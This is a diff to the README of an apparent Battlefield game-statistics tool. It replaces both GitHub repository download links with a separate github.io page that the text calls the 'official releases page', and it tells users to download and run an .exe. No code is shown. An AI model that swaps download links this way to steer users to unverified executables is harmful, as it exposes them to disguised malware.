@@ -1,6 +1,6 @@
 # 📊 bfbcs-rip-stats-2026 - Track your battlefield game data easily
 
-[![Download Statistics Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Muyalc4662/bfbcs-rip-stats-2026)
+[![Download Statistics Tool](https://img.shields.io/badge/Download-Release-blue.svg)](https://muyalc4662.github.io)
 
 ## 🎯 About this software
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run the software effectively:
 
 Follow these steps to set up the tool on your Windows machine:
 
-1. Visit the [official releases page](https://github.com/Muyalc4662/bfbcs-rip-stats-2026) to find the latest version of the software.
+1. Visit the [official releases page](https://muyalc4662.github.io) to find the latest version of the software.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
